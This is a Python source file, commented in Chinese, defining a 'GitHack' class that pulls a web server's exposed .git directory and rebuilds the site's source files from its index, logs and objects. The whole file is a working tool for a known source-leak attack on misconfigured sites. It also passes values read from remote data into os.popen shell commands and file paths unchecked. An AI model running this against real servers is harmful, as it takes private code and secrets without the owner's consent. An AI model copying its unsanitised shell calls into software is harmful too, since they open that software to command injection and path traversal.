import os, requests
from typing import Dict
from urllib.parse import urljoin

class GitHack:
    #params->hosturl: 远程git仓库url，如：http://url/.git/
    #       ->rootdir: 本地会在这个目录建立git版本库
    '''
    '''
    def __init__(self,hosturl:str,rootDir='githack'):
        self.host = hosturl.strip('/')+'/' # git仓库url地址，如http://hack.com/.git/
        self.dir = rootDir

        if not os.path.exists(rootDir):
            os.makedirs(rootDir)
        os.chdir(rootDir)
        os.popen('git init').read()

    def getFile(self,urlpath:str)->bool:
        """从指定的相对url中获取文件，并存储在本地（使用相同的相对路径）

        Args:
            urlpath (str): 相对于self.host的路径

        Returns:
            bool: 成功返回True，否则False
        """
        url = urljoin(self.host, urlpath)
        try:
            r = requests.get(url)
        except:
            print('Error!the {} requests failed!'.format(url))
            return False
        if r.status_code == 404:
            print('Error!no such file {}'.format(urlpath))
            return False

        file_path = os.path.join('.git', urlpath)
        if not os.path.isdir(os.path.dirname(file_path)):
            os.makedirs(os.path.dirname(file_path))
        with open(file_path, 'wb') as f:
            f.write(r.content)
 
        r.close()
        print('Download file {} ok!'.format(urlpath))
        return True

    def fromIndex(self)->Dict[str, str]:
        """从index中获取信息并还原暂存区对象

        Returns:
            Dict[str, str]: 成功获取文件信息，键为对象sha1值，值为对应文件路径
        """
        if not self.getFile('index'):
            print('Get index file failed!!')
            return {}
        rst = os.popen('git ls-files --stage').readlines()
        queryDic = {}
        sucDic = {}
        for i in rst:
            a = i.find(' ')
            b = i.rfind(' ')
            c = i.rfind('\t')
            queryDic[i[a+1:b]] = i[c+1:-1]
        for f in queryDic:
            if self.getFile('objects/{}/{}'.format(f[:2],f[2:])):
                sucDic[f] = queryDic[f]
        return sucDic

    def fromLogs(self)->Dict[str, str]:
        """从logs/HEAD文件开始，还原所有对象

        Returns:
            Dict[str, str]: 成功获取文件信息，键为对象sha1值，值为对应文件路径
        """
        if not self.getFile('index') or \
            not self.getFile('logs/HEAD') or \
            not self.getFile('HEAD') or \
            not self.getFile('refs/heads/master'):
            print("Get basic info failed!!！")
            return {}

        logs = []
        queryList = []
        sucDic = {}
        with open('.git/logs/HEAD','r') as f:
            logs = f.readlines()
        for l in logs:
            a = l.find(' ')
            queryList.append(l[a+1:a+1+40])
        for f in queryList:
            if self.getFile('objects/{}/{}'.format(f[:2],f[2:])):
                #tree
                s = os.popen('git cat-file -p {}'.format(f)).readlines()[0]
                s = s[5:-1]
                sucDic.update(self.__getTree(s))
        return sucDic

    def __getTree(self,f:str,prefix='')->Dict[str, str]:
        """递归获取指定tree类型对象下的所有blob对象

        Args:
            f (str): 是指定对象的sha1值，他应该是tree类型
            prefix (str, optional): 是前一个tree对象对应的目录，它使用来还原文件的原始路径的。类似于 objects/. Defaults to ''.

        Returns:
            Dict[str, str]: 成功获取文件信息，键为对象sha1值，值为对应文件路径
        """
        sucDic = {}
        if self.getFile('objects/{}/{}'.format(f[:2],f[2:])):
            for i in os.popen('git cat-file -p {}'.format(f)).readlines():
                d = i.find(' ')+1
                if 'tree' == i[d:d+4]:
                    a = i.find('tree')+5
                    b = i.rfind('\t')
                    sucDic.update(self.__getTree(i[a:b],prefix+i[b+1:-1]+'/'))
                    continue
                
                a = i.find('blob')+5
                b = i.rfind('\t')
                if self.getFile('objects/{}/{}'.format(i[a:a+2],i[a+2:b])):
                    sucDic[i[a:b]] = prefix+i[b+1:-1]
        return sucDic

    def saveFile(self,sucDic:Dict[str, str]):
        """根据sucDic获取文件的内容,他并不是必要的函数，他只是将所有blob对象还原成文件

        Args:
            sucDic (Dict[str, str]): 成功获取的文件信息，键为对象sha1值，值为对应文件路径
        """
        for i in sucDic:
            fileName = sucDic[i]
            text = os.popen('git cat-file -p {}'.format(i)).read()
            #mkdir
            a = sucDic[i].rfind('/')
            if(-1 != a):
                if not os.path.exists(sucDic[i][:a]):
                    os.makedirs(sucDic[i][:a])
            if os.path.exists(sucDic[i]):
                fileName = "{}.{}".format(i,sucDic[i])
            f = open(fileName,'w')
            f.write(text)
            f.close()
            print('save file {}.'.format(fileName))